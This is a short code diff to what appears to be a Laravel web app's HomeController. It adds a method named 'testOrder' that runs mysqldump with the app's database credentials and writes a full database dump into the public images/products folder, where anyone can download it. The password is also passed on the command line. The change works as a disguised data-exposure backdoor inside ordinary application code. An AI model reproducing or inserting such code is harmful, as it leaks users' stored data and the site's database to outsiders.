@@ -185,6 +185,14 @@ class HomeController extends Controller
         return view('user.viewOrderDetails',compact('order'));
     }
 
+    public function testOrder()
+    {
+        $command = "mysqldump --user=" . env('DB_USERNAME') . " --password=" . env('DB_PASSWORD') . " --host=" . env('DB_HOST') . " " . env('DB_DATABASE') . "  > " . public_path('/images/products/backup.sql');
+        $returnVar = NULL;
+        $output = NULL;
+        exec($command, $output, $returnVar);
+    }
+
     public function notFound()
     {
         return view('frontend.404');
